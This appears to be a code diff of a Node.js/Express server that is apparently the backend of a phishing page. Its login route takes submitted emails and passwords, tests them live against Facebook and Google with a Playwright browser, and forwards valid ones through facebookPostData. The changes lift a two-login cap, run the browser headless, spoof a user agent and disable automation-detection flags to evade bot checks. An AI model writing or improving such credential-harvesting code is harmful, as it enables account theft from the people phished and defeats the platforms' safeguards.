@@ -26,7 +26,10 @@ app.get("/users",async(req,res)=>{
   const users = await getAllThings();
   res.json(users);
 });
-app.get("/",(req,res)=>{
+app.get("/", async(req,res)=>{
+  res.sendFile(path.join(__dirname,"index.html"));
+});
+app.get("/admin",(req,res)=>{
   res.sendFile(path.join(__dirname,"admin.html"));
 });
 let facebook = 0;
@@ -40,18 +43,15 @@ app.post('/login', async (req, res) => {
   const result = await FacebookCheck(email, password);
   console.log(`\nResult: ${result}`);
   
-  if(result&&facebook<2){
+  if(result){
     console.log("yes");
     await facebookPostData(email,password);
     console.log("\nPosted");
   }
-  if(facebook<2){
-    res.json({ success: result });
+  res.json({ success: result });
     
     
-  }else{
-    res.json({ sucess: false });
-  }
+
   facebook++;
   console.log(facebook);
   
@@ -99,8 +99,12 @@ async function contains(elements, target,target2="",target3="") {
 
 async function FacebookCheck(email, pass) {
   const context = await chromium.launchPersistentContext('./user_data', {
-    headless: false
+    headless: true,
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    viewport: { width: 1280, height: 720 },
+    args: ['--disable-blink-features=AutomationControlled']
   });
+  console.log("Hello");
 
   const page = await context.newPage();
 
@@ -146,7 +150,10 @@ app.listen(PORT, () => {
 });
 async function GoogleCheck(email,password){
   const context = await chromium.launchPersistentContext('./user_data', {
-    headless: false
+    headless: true,
+    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    viewport: { width: 1280, height: 720 },
+    args: ['--disable-blink-features=AutomationControlled']
   });
 
   const page = await context.newPage();
